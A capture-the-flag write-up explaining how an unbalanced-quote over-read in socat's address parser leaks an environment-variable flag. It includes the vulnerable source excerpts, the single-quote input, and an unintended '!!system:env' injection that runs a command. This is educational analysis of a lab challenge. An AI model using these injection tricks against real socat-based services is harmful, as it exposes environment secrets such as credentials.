# baby?socat (Binary Exploitation)
> I love sockets and cats and socat and `ls`

The challenge runs your input as an argument to `socat`, a program that is able to relay data to/from different types of streams/sources. It's implemented as a shell script:
```sh
#!/bin/bash
echo -n "Give me your command: "
read -e -r input
input="exec:./chal ls $input"

# i have to give you stderr
FLAG="irisctf{they_even_fixed_it_for_unbalanced_double_quotes}" socat - "$input" 2>&0
```

The flag is passed as the first environment variable to `socat`, and socat is set up to execute a `chal` binary with the parameters `ls` and then the input taking the rest. The chal binary is a C program that just sets the FLAG env empty:
```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if(argc < 2) return -1;
    if(setenv("FLAG", "NO!", 1) != 0) return -1;
    execvp(argv[1], argv+1);
    return 0;
}
```

The intended solution was to exploit a bug still in socat that caused an over-read of the command line into `envp`. The socat changelog mentions there was a bug fixed earlier where unbalanced `"` quotes would cause this behaviour.
```
Corrections:
	Socats address parser read over end of string when there were unbalanced
	quotes
	Test: UNBALANCED_QUOTE
```

The code for this check is implemented in `nestlex.c` as follows:
```c
/* check for soft quoting pattern */
quotx = squotes;
while (squotes && *quotx) {
	if (!strncmp(in, *quotx, strlen(*quotx))) { // if there's a " quote
        // ...
        result = _nestlex(/* ... */); // recursively call the lexer
        // ...
        if (result == 0 && dropquotes) {
           /* we strip the trailing quote */
           if (!in[0] || strncmp(in, *quotx, strlen(*quotx)))  return 1; // <---
           in += strlen(*quotx);
        } /* continue parsing input */
    }
}
```
The condition tries to drop the end quotes after the recursive parser is done. The marked line causes the parser to throw an error (return 1) if there is no more nested input to remove, or there's no more quotes in the input.

However, this fix was not applied just above:
```c
/* check for hard quoting pattern */
quotx = hquotes;
while (hquotes && *quotx) {
    if (!strncmp(in, *quotx, strlen(*quotx))) {
        // ...
        result = _nestlex(/* ... */); // recursively call the lexer
        // ...
	    if (result == 0 && dropquotes) {
        if (result == 0 && dropquotes) {
            /* we strip this quote */
            in += strlen(*quotx);
            // ^^^ if input is the end (null), then it overreads the string by adding 1
        } /* continue parsing input */
    }       
}
```

We can exploit that just by sending an unclosed single quote:
```
Give me your command: '
ls: cannot access 'FLAG=irisctf{they_even_fixed_it_for_unbalanced_double_quotes}': No such file or directory
2023/01/09 11:43:29 socat[2] E waitpid(): child 3 exited with status 2
```

```
irisctf{they_even_fixed_it_for_unbalanced_double_quotes}
```

There was an unintended solution using `!!`. I thought I made a mistake in my bash allowing for a command escape, but it's actually a feature in socat - if you specify `!!`, socat will use the next text as another address specification that will be used for writing back out data to stdout! So `!!system:env` passes the output of ls to env first, which of course does not care about stdin and leaks the flag.
